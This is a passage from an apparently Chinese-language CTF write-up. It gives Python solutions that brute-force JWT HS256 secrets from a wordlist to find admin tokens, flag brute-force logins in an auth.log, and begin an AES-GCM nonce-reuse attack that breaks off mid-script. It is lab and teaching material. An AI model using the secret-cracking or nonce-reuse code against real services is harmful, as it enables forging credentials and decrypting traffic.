class="hljs-string">eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpYXQiOjE3NTM2MTA0MDAsImV4cCI6MTc1NjIwMjQwMCwic3ViIjoiYWxpY2UiLCJpc3MiOiJzdmMtZ3ciLCJyb2xlIjoidmlld2VyIn0.PQCppoULjVaNOr2F27nbQC1XxCnInT_rjV82w8NsRLQ</span><br><span class="hljs-string">eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJpYXQiOjE3NTM2MTA0MDAsImV4cCI6MTc1NjIwMjQwMCwic3ViIjoibWFsbG9yeSIsImlzcyI6InN2Yy1ndyIsImFkbWluIjp0cnVlfQ.LaktQpFf0FESB4ebaK5SMkesB-Z6F_tgZD3M7ZjZgDyQK_bzsGGUF72Ek23iUHohOTNzD3QRQHx7GEudROj1GVYqSpPmhwWDAkm_QQOMtZddBwdyJoBF7Nm86frkgU1hvvdCp3wn1EzxpS6psDDYe6eHFSkjp-nJefipi3cFDtt4AOxoNhtXxQiceZimV4HXL4xJb_cn8ctQBLec0ecrHBpxCxvjmQ9rilU0LWSL8W_ur5cslFlps1Kj6T2_IR_z0HgFPk0zgyWwni99UCxPjR6RhUXPNCml_iAqP8b476Hm6_rbUY9nDaEKStgl_Ty5vdBaseoHV_rCxEZKldpbcA</span><br><span class="hljs-string">eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpYXQiOjE3NTM2MTA0MDAsImV4cCI6MTc1NjIwMjQwMCwic3ViIjoiZXZlIiwiaXNzIjoic3ZjLWFwaSIsInJvbGUiOiJ2aWV3ZXIifQ.WdsF3ZxesIxKmtC6csh9gk3_9rilZq5l3cKBIJv11Ac</span><br><span class="hljs-string">eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJpYXQiOjE3NTM2MTA0MDAsImV4cCI6MTc1NjIwMjQwMCwic3ViIjoiZGF2ZSIsImlzcyI6InN2Yy1hcGkiLCJhZG1pbiI6dHJ1ZX0.AiE4y_tUSnIpSgT2Qum3_vo7-dDj-El17v5wgEcgiFXcBn5YfCBlxuoPqIWaySkepfSljtAn5VHGcy5e0xxGg6Qj9aLA3adSZHhWqxievNjawhy72sKOz6gnzky8HjeLLIA-_zHktGV1PoIEcr0NE4cjod_cRpB6hdGqEDV-XOzuw9exyK2bdPnYqHNJ5-8Qz2X7dSyVQXlMGutrQXANXcbcKsy6SptNr6Ok9ZIPXxbx6X2CW8k5SMe12R6eBPUL94TU14X5a3EZFq6S-P9qCJT84oweroS2nGAFJrZlK3mk4PhjOzhFl6j-EBuTtgtpZxJ3he-MBbaznzp1rZaCDQ</span><br><span class="hljs-string">eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJpYXQiOjE3NTM2MTA0MDAsImV4cCI6MTc1NjIwMjQwMCwic3ViIjoiYWxpY2UiLCJpc3MiOiJzdmMtYXBpIiwiYWRtaW4iOnRydWV9.XTWgQgovF-CFKd5Vnr5W38t4jm0qthD7ZreQYrH_NY2MvmbuE44ebWWNTq1e-85xymkxCxYKuGAjAtAZNAeDybiFnpBvbSp96IgenyL3CdICAitShWFRr_wCUGiIhSLhy_iJYeLI2T6ag0H78LnMlho7_QXwS7s8jhRRs8-Bioa47SgfRtq1Zu-Pr94nS2mqVwrueNWSWIRlCMjSwpEtL4Riay5j-iM5Tuzd3b2_Sqk_aLUzMfTTkAddd_DlRZdeiJxjPhtOCFx4nXfak_efruqmiKPo1w59aA8Y60C6NgHnmJVzLAJWsa-w5ugHqynWOqp0IlcfEy3ej6wPzmY1_w</span><br><span class="hljs-string">eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpYXQiOjE3NTM2MTA0MDAsImV4cCI6MTc1NjIwMjQwMCwic3ViIjoiY2Fyb2wiLCJpc3MiOiJzdmMtYXV0aCIsImFkbWluIjp0cnVlfQ.eA35hXftK-fdBrkUE6b3y_ThrUvE6Lou9gLfVB-_emU</span><br><span class="hljs-string">eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpYXQiOjE3NTM2MTA0MDAsImV4cCI6MTc1NjIwMjQwMCwic3ViIjoiYWxpY2UiLCJpc3MiOiJzdmMtYXBpIiwicm9sZSI6InZpZXdlciJ9.74HdzHvRdKSz7bdCVPKX5L1uMYAd4UMrMjEpxDjkT-o</span><br><span class="hljs-string">eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpYXQiOjE3NTM2MTA0MDAsImV4cCI6MTc1NjIwMjQwMCwic3ViIjoiYm9iIiwiaXNzIjoic3ZjLWF1dGgiLCJyb2xlIjoidmlld2VyIn0.wkcbqeKGN4q_3Zr-nDuhkjLC7mGEkka0Xf5cGutaNjE</span><br><span class="hljs-string">eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpYXQiOjE3NTM2MTA0MDAsImV4cCI6MTc1NjIwMjQwMCwic3ViIjoiYm9iIiwiaXNzIjoic3ZjLWFwaSIsInJvbGUiOiJzdXBlcnVzZXIifQ.bUZRWHiEe52iSLH6-WnNPCsSJVQ4ZukXq7ljVyrNWlQ</span><br><span class="hljs-string">eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpYXQiOjE3NTM2MTA0MDAsImV4cCI6MTc1NjIwMjQwMCwic3ViIjoiY2Fyb2wiLCJpc3MiOiJzdmMtYXBpIiwicm9sZSI6InVzZXIifQ.McO9wtCNn5PpOTZqZqWZb01iI1du9pzydOIySUcpUvE</span><br><span class="hljs-string">eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpYXQiOjE3NTM2MTA0MDAsImV4cCI6MTc1NjIwMjQwMCwic3ViIjoiZXZlIiwiaXNzIjoic3ZjLWFwaSIsInJvbGUiOiJhbmFseXN0In0.kS1oBf0_mOqFLskYFG00MXdvFZcGHKVlrTcUWnvq4Ss</span><br><span class="hljs-string">eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpYXQiOjE3NTM2MTA0MDAsImV4cCI6MTc1NjIwMjQwMCwic3ViIjoiYWxpY2UiLCJpc3MiOiJzdmMtZ3ciLCJhZG1pbiI6dHJ1ZX0.M3PnTIGbdHHa_5h0PjNuw-kjov24nYQ5_0KVLkIWfp4</span><br><span class="hljs-string">eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpYXQiOjE3NTM2MTA0MDAsImV4cCI6MTc1NjIwMjQwMCwic3ViIjoiYm9iIiwiaXNzIjoic3ZjLWFwaSIsImFkbWluIjp0cnVlfQ.eofNcjj6xkHj3_PHjH07z9GkxGOhg7wCWC5g7uC5IVg</span><br><span class="hljs-string">eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpYXQiOjE3NTM2MTA0MDAsImV4cCI6MTc1NjIwMjQwMCwic3ViIjoiZXZlIiwiaXNzIjoic3ZjLWFwaSIsInJvbGUiOiJhbmFseXN0In0.l__G2hCuhUWiW5dqZ9IXVYPyBlIrO9JesFD4s0T_A6o</span><br><span class="hljs-string">eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJpYXQiOjE3NTM2MTA0MDAsImV4cCI6MTc1NjIwMjQwMCwic3ViIjoiZGF2ZSIsImlzcyI6InN2Yy1hcGkiLCJyb2xlIjoidXNlciJ9.o2J8jpkJnoGty5BsLRMCpGSTEgK6XdDDgOR8uPe4aHIQY0GEWPnqdJ6vq_MOqAS8Az-B9BCXmziNZoqfLEPq25VECS8OVqvCCywR3LkwULe28goEH8cpxX7KlnXLdJhNWdQSJz6YM_Odno1EYTvFg2f84Oh2BNou4wO74M1anW0FKhn3ORbmjK5w6h5lc4O0Thu2DabG1MM0UTsQIp3XvImbLk6tKDD3uvJUvLTLR-SxXMTnFDLvD98Z_bOtrVB4fVPeetr9M9LTUuaEHIh_4D-KpQ3VGrH3two778O7nOO6LAgoLvCpy1iuDxVJ_cD-w9BAcq7P8aEUMCUILzV1SA</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br><br><span class="hljs-comment"># 从 public_key.pem 提取的内容</span><br>PUBLIC_KEY_CONTENT = <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">-----BEGIN PUBLIC KEY-----</span><br><span class="hljs-string">MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAv/XeR140bweC8pkyVGai</span><br><span class="hljs-string">1E/SemBHt71gjhaHgQkS0AmhUhziWVXl26nEX65Ur7surRNG8inpJwF3l16vtBhy</span><br><span class="hljs-string">pRKc1kG2Ng7IXfjsrZdaNOv5PEYuR+fJvbakoY/iSRELZXqmcYqyeokZCl6PgK7P</span><br><span class="hljs-string">pHhW91m+YqcpEX35xPPWi8EI9n8ogUF9MSpY9AkAstcl3hTmEclBm4NLskmdYcOs</span><br><span class="hljs-string">6TuPiHJalGQWmpODB5VDotsHCM+t/e5Id/vhwVZPu8c8Q0Vjs+AwL68sihd5deNl</span><br><span class="hljs-string">wArGUvuFxB9JAMCUaGKMapfLXB12Cs/yArBoABtVm5hEdSH3UUYYOsFmB99qQZ+v</span><br><span class="hljs-string">cQIDAQAB</span><br><span class="hljs-string">-----END PUBLIC KEY-----</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">check_admin_permissions</span>(<span class="hljs-params">payload</span>):<br>    <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">    检查JWT载荷是否包含管理员权限。</span><br><span class="hljs-string"></span><br><span class="hljs-string">    管理员权限条件：</span><br><span class="hljs-string">    1. &#x27;admin&#x27; 键的值为 True (布尔值或字符串 &quot;true&quot;)</span><br><span class="hljs-string">    2. &#x27;role&#x27; 键的值为 &#x27;admin&#x27; 或 &#x27;superuser&#x27;</span><br><span class="hljs-string"></span><br><span class="hljs-string">    返回: True 如果有管理员权限,否则 False。</span><br><span class="hljs-string">    &quot;&quot;&quot;</span><br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> <span class="hljs-built_in">isinstance</span>(payload, <span class="hljs-built_in">dict</span>):<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br><br>    <span class="hljs-comment"># 条件1: admin=true (兼容布尔值和字符串)</span><br>    admin_flag = payload.get(<span class="hljs-string">&#x27;admin&#x27;</span>)<br>    <span class="hljs-keyword">if</span> admin_flag <span class="hljs-keyword">is</span> <span class="hljs-literal">True</span> <span class="hljs-keyword">or</span> <span class="hljs-built_in">str</span>(admin_flag).lower() == <span class="hljs-string">&#x27;true&#x27;</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br><br>    <span class="hljs-comment"># 条件2: role in &#123;&#x27;admin&#x27;, &#x27;superuser&#x27;&#125;</span><br>    role = payload.get(<span class="hljs-string">&#x27;role&#x27;</span>)<br>    <span class="hljs-keyword">if</span> role <span class="hljs-keyword">in</span> [<span class="hljs-string">&#x27;admin&#x27;</span>, <span class="hljs-string">&#x27;superuser&#x27;</span>]:<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br><br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>():<br>    <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">    主函数，执行JWT审计任务。</span><br><span class="hljs-string">    &quot;&quot;&quot;</span><br>    <span class="hljs-comment"># 1. 从硬编码的字符串加载数据</span><br>    <span class="hljs-comment"># .strip()去除首尾空白, .splitlines()按行分割</span><br>    wordlist = WORDLIST_CONTENT.strip().splitlines()<br>    jwt_tokens = TOKENS_CONTENT.strip().splitlines()<br>    public_key = PUBLIC_KEY_CONTENT.strip()<br><br>    valid_admin_indices = []<br><br>    <span class="hljs-comment"># 2. 遍历所有JWT令牌进行审计 (enumerate 从1开始计数)</span><br>    <span class="hljs-keyword">for</span> index, token <span class="hljs-keyword">in</span> <span class="hljs-built_in">enumerate</span>(jwt_tokens, <span class="hljs-number">1</span>):<br>        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> token:<br>            <span class="hljs-keyword">continue</span><br><br>        <span class="hljs-keyword">try</span>:<br>            <span class="hljs-comment"># 首先无验证地解码头部以获取签名算法 (alg)</span><br>            header = jwt.get_unverified_header(token)<br>            alg = header.get(<span class="hljs-string">&#x27;alg&#x27;</span>)<br><br>            payload = <span class="hljs-literal">None</span><br>            is_signature_valid = <span class="hljs-literal">False</span><br><br>            <span class="hljs-comment"># 根据算法进行签名验证</span><br>            <span class="hljs-keyword">if</span> alg == <span class="hljs-string">&#x27;HS256&#x27;</span>:<br>                <span class="hljs-comment"># 逐一尝试字典中的密码</span><br>                <span class="hljs-keyword">for</span> secret <span class="hljs-keyword">in</span> wordlist:<br>                    <span class="hljs-keyword">try</span>:<br>                        <span class="hljs-comment"># 尝试验证签名并解码，忽略过期时间</span><br>                        payload = jwt.decode(<br>                            token,<br>                            secret,<br>                            algorithms=[<span class="hljs-string">&#x27;HS256&#x27;</span>],<br>                            options=&#123;<span class="hljs-string">&quot;verify_exp&quot;</span>: <span class="hljs-literal">False</span>, <span class="hljs-string">&quot;verify_signature&quot;</span>: <span class="hljs-literal">True</span>&#125;<br>                        )<br>                        is_signature_valid = <span class="hljs-literal">True</span><br>                        <span class="hljs-keyword">break</span>  <span class="hljs-comment"># 密码正确，停止尝试</span><br>                    <span class="hljs-keyword">except</span> jwt.InvalidSignatureError:<br>                        <span class="hljs-keyword">continue</span>  <span class="hljs-comment"># 密码错误，尝试下一个</span><br><br>            <span class="hljs-keyword">elif</span> alg == <span class="hljs-string">&#x27;RS256&#x27;</span>:<br>                <span class="hljs-comment"># 使用公钥验证签名</span><br>                <span class="hljs-keyword">try</span>:<br>                    payload = jwt.decode(<br>                        token,<br>                        public_key,<br>                        algorithms=[<span class="hljs-string">&#x27;RS256&#x27;</span>],<br>                        options=&#123;<span class="hljs-string">&quot;verify_exp&quot;</span>: <span class="hljs-literal">False</span>, <span class="hljs-string">&quot;verify_signature&quot;</span>: <span class="hljs-literal">True</span>&#125;<br>                    )<br>                    is_signature_valid = <span class="hljs-literal">True</span><br>                <span class="hljs-keyword">except</span> jwt.InvalidSignatureError:<br>                    <span class="hljs-keyword">pass</span>  <span class="hljs-comment"># 签名无效，is_signature_valid 保持 False</span><br><br>            <span class="hljs-comment"># 3. 如果签名验证通过，则检查管理员权限</span><br>            <span class="hljs-keyword">if</span> is_signature_valid <span class="hljs-keyword">and</span> payload:<br>                <span class="hljs-keyword">if</span> check_admin_permissions(payload):<br>                    valid_admin_indices.append(index)<br><br>        <span class="hljs-keyword">except</span> jwt.DecodeError:<br>            <span class="hljs-comment"># JWT格式本身有问题，跳过</span><br>            <span class="hljs-comment"># print(f&quot;警告: 令牌 &#123;index&#125; 格式错误，已跳过。&quot;)</span><br>            <span class="hljs-keyword">continue</span><br>        <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>            <span class="hljs-comment"># 捕获其他未知错误以防脚本中断</span><br>            <span class="hljs-comment"># print(f&quot;警告: 处理令牌 &#123;index&#125; 时发生未知错误: &#123;e&#125;&quot;)</span><br>            <span class="hljs-keyword">continue</span><br><br>    <span class="hljs-comment"># 4. 按要求格式化并输出结果</span><br>    <span class="hljs-comment"># 将找到的序号从小到大排序并用冒号连接</span><br>    result_string = <span class="hljs-string">&quot;:&quot;</span>.join(<span class="hljs-built_in">map</span>(<span class="hljs-built_in">str</span>, <span class="hljs-built_in">sorted</span>(valid_admin_indices)))<br>    flag = <span class="hljs-string">f&quot;flag&#123;&#123;<span class="hljs-subst">&#123;result_string&#125;</span>&#125;&#125;&quot;</span><br><br>    <span class="hljs-built_in">print</span>(flag)<br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    main()<br></code></pre></td></tr></table></figure><p>拿到 flag</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">flag</span>&#123;<span class="hljs-number">1</span>:<span class="hljs-number">3</span>:<span class="hljs-number">4</span>:<span class="hljs-number">5</span>:<span class="hljs-number">9</span>:<span class="hljs-number">14</span>:<span class="hljs-number">15</span>:<span class="hljs-number">17</span>:<span class="hljs-number">19</span>:<span class="hljs-number">20</span>:<span class="hljs-number">21</span>:<span class="hljs-number">24</span>:<span class="hljs-number">27</span>:<span class="hljs-number">28</span>&#125;<br></code></pre></td></tr></table></figure><h2 id="Brute-Force-Detection"><a href="#Brute-Force-Detection" class="headerlink" title="Brute_Force_Detection"></a>Brute_Force_Detection</h2><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs x86asm">模式定义：同一源<span class="hljs-built_in">IP</span>在 <span class="hljs-number">10</span>分钟内 针对同一用户 连续<span class="hljs-number">5</span>次失败，并且 紧接 第<span class="hljs-number">5</span>次失败 下一次尝试成功。 检测到上述模式的源<span class="hljs-built_in">IP</span>记为一次暴力破解成功迹象。<br><br>任务：给定按时间排序的 auth<span class="hljs-number">.</span>log（格式：YYYY-mm-<span class="hljs-built_in">dd</span> HH:MM:<span class="hljs-built_in">SS</span> RESULT user=&lt;u&gt; <span class="hljs-built_in">ip</span>=&lt;a<span class="hljs-number">.</span>b<span class="hljs-number">.</span>c<span class="hljs-number">.</span>d&gt;）， 输出 出现过该模式的唯一源<span class="hljs-built_in">IP</span>内容，flag格式：flag&#123;ip1:ip2...&#125;，<span class="hljs-built_in">IP</span>顺序从小到大。<br></code></pre></td></tr></table></figure><p>脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> re<br><span class="hljs-keyword">from</span> datetime <span class="hljs-keyword">import</span> datetime<br><span class="hljs-keyword">from</span> collections <span class="hljs-keyword">import</span> defaultdict<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">find_brute_force_ips</span>(<span class="hljs-params">log_file_path: <span class="hljs-built_in">str</span></span>) -&gt; <span class="hljs-built_in">str</span>:<br>    <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">    从 auth.log 文件中分析并找出符合特定暴力破解模式的源 IP。</span><br><span class="hljs-string"></span><br><span class="hljs-string">    模式定义：</span><br><span class="hljs-string">    在10分钟内，同一源IP针对同一用户连续5次登录失败，</span><br><span class="hljs-string">    并且紧接着第5次失败后的下一次尝试为成功。</span><br><span class="hljs-string"></span><br><span class="hljs-string">    Args:</span><br><span class="hljs-string">        log_file_path (str): 按时间排序的 auth.log 文件路径。</span><br><span class="hljs-string"></span><br><span class="hljs-string">    Returns:</span><br><span class="hljs-string">        str: 格式为 flag&#123;ip1:ip2...&#125; 的结果字符串，IP按数值从小到大排序。</span><br><span class="hljs-string">    &quot;&quot;&quot;</span><br>    <span class="hljs-comment"># 正则表达式用于解析日志行</span><br>    <span class="hljs-comment"># 格式: YYYY-mm-dd HH:MM:SS RESULT user=&lt;u&gt; ip=&lt;a.b.c.d&gt;</span><br>    log_pattern = re.<span class="hljs-built_in">compile</span>(<br>        <span class="hljs-string">r&quot;^(?P&lt;timestamp&gt;\d&#123;4&#125;-\d&#123;2&#125;-\d&#123;2&#125; \d&#123;2&#125;:\d&#123;2&#125;:\d&#123;2&#125;)\s+&quot;</span><br>        <span class="hljs-string">r&quot;(?P&lt;result&gt;SUCCESS|FAIL)\s+&quot;</span><br>        <span class="hljs-string">r&quot;user=(?P&lt;user&gt;\w+)\s+&quot;</span><br>        <span class="hljs-string">r&quot;ip=(?P&lt;ip&gt;[\d\.]+)$&quot;</span><br>    )<br><br>    <span class="hljs-comment"># 存储每个 (ip, user) 组合的连续失败时间戳</span><br>    <span class="hljs-comment"># key: (ip_address, username)</span><br>    <span class="hljs-comment"># value: [timestamp1, timestamp2, ...]</span><br>    failure_states = defaultdict(<span class="hljs-built_in">list</span>)<br><br>    found_ips = <span class="hljs-built_in">set</span>()<br><br>    <span class="hljs-keyword">try</span>:<br>        <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(log_file_path, <span class="hljs-string">&#x27;r&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>            <span class="hljs-keyword">for</span> line <span class="hljs-keyword">in</span> f:<br>                <span class="hljs-keyword">match</span> = log_pattern.<span class="hljs-keyword">match</span>(line.strip())<br>                <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">match</span>:<br>                    <span class="hljs-keyword">continue</span><br><br>                data = <span class="hljs-keyword">match</span>.groupdict()<br>                timestamp = datetime.strptime(data[<span class="hljs-string">&#x27;timestamp&#x27;</span>], <span class="hljs-string">&quot;%Y-%m-%d %H:%M:%S&quot;</span>)<br>                result = data[<span class="hljs-string">&#x27;result&#x27;</span>]<br>                user = data[<span class="hljs-string">&#x27;user&#x27;</span>]<br>                ip = data[<span class="hljs-string">&#x27;ip&#x27;</span>]<br><br>                key = (ip, user)<br><br>                <span class="hljs-keyword">if</span> result == <span class="hljs-string">&#x27;SUCCESS&#x27;</span>:<br>                    <span class="hljs-comment"># 检查此用户和IP之前是否有失败记录</span><br>                    <span class="hljs-keyword">if</span> key <span class="hljs-keyword">in</span> failure_states:<br>                        <span class="hljs-comment"># 检查是否是紧跟在5次失败之后</span><br>                        <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(failure_states[key]) == <span class="hljs-number">5</span>:<br>                            first_failure_time = failure_states[key][<span class="hljs-number">0</span>]<br>                            time_difference = timestamp - first_failure_time<br><br>                            <span class="hljs-comment"># 检查整个序列（从第一次失败到成功）是否在10分钟内</span><br>                            <span class="hljs-keyword">if</span> time_difference.total_seconds() &lt;= <span class="hljs-number">600</span>:<br>                                found_ips.add(ip)<br><br>                        <span class="hljs-comment"># 无论是否匹配，成功都会打破连续失败的链条，因此清空状态</span><br>                        <span class="hljs-keyword">del</span> failure_states[key]<br><br>                <span class="hljs-keyword">elif</span> result == <span class="hljs-string">&#x27;FAIL&#x27;</span>:<br>                    <span class="hljs-comment"># 添加当前失败的时间戳</span><br>                    failure_states[key].append(timestamp)<br><br>                    <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(failure_states[key]) &gt; <span class="hljs-number">5</span>:<br>                        failure_states[key] = failure_states[key][-<span class="hljs-number">5</span>:]<br><br>    <span class="hljs-keyword">except</span> FileNotFoundError:<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">f&quot;错误：日志文件未找到 -&gt; <span class="hljs-subst">&#123;log_file_path&#125;</span>&quot;</span><br>    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">f&quot;处理日志时发生错误: <span class="hljs-subst">&#123;e&#125;</span>&quot;</span><br><br>    <span class="hljs-comment"># 如果没有找到符合模式的IP，返回空的flag</span><br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> found_ips:<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;flag&#123;&#125;&quot;</span><br><br>    <span class="hljs-comment"># 对IP地址进行数值排序</span><br>    <span class="hljs-comment"># &#x27;2.0.0.0&#x27; 应排在 &#x27;10.0.0.0&#x27; 之前</span><br>    sorted_ips = <span class="hljs-built_in">sorted</span>(<span class="hljs-built_in">list</span>(found_ips), key=<span class="hljs-keyword">lambda</span> ip: <span class="hljs-built_in">tuple</span>(<span class="hljs-built_in">map</span>(<span class="hljs-built_in">int</span>, ip.split(<span class="hljs-string">&#x27;.&#x27;</span>))))<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-string">f&quot;flag&#123;&#123;<span class="hljs-subst">&#123;<span class="hljs-string">&#x27;:&#x27;</span>.join(sorted_ips)&#125;</span>&#125;&#125;&quot;</span><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    log_filename = <span class="hljs-string">&#x27;auth.log&#x27;</span><br><br>    result_flag = find_brute_force_ips(log_filename)<br>    <span class="hljs-built_in">print</span>(result_flag)<br></code></pre></td></tr></table></figure><p>拿到 flag</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">flag</span>&#123;<span class="hljs-number">192.168.3.13:192</span>.<span class="hljs-number">168</span>.<span class="hljs-number">5</span>.<span class="hljs-number">15</span>&#125;<br></code></pre></td></tr></table></figure><h1 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h1><h2 id="AES-GCM-IV-Reuse"><a href="#AES-GCM-IV-Reuse" class="headerlink" title="AES_GCM_IV_Reuse"></a>AES_GCM_IV_Reuse</h2><p>ai 一把梭</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> binascii<br><br>KNOWN_MESSAGE_STR = <span class="hljs-string">&quot;The flag is hidden somewhere in this encrypted system.&quot;</span><br>KNOWN_CIPHERTEXT_HEX = <span class="hljs-string">&quot;b7eb5c9e8ea16f3dec89b6dfb65670343efe2ea88e0e88c490da73287c86e8ebf375ea1194b0d8b14f8b6329a44f396683f22cf8adf8&quot;</span><br>FLAG_CIPHERTEXT_HEX = <span class="hljs-string">&quot;85ef58d9938a4d1793a993a0ac0c612368cf3fa8be07d9dd9f8c737d299cd9adb76fdc1187b6c3a00c866a20&quot;</span><br><br><br><span 